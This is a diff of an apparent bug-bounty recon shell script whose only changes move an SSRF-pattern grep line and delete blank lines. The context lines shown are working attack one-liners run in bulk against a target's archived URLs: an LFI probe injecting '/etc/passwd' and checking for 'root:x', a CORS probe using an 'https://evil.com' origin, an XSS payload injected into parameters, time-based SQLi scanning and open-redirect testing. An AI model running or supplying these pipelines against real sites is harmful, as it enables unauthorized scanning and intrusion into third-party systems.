@@ -64,7 +64,7 @@ cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
 cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
 cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
 cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
-
+cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt
 
 
 
@@ -109,7 +109,7 @@ xargs -a sqli.list -P 50 -I % bash -c "echo % | jeeves --payload-time 5" | grep 
  
 gau $domain | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee -a vlfi.txt
 
-cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt 
+
 
 site="$domain"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done | tee -a cors.txt
 
@@ -122,8 +122,6 @@ gospider -S gfpatternsscan/xssGF.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" 
 gospider -S paramspideroutput.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee v1xss.txt   
 
 gospider -S paramspideroutput.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>' | tee -a xss2.txt
-
-
 
 export LHOST="waybackdata"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | tee -a vOpen-redirect.txt
 
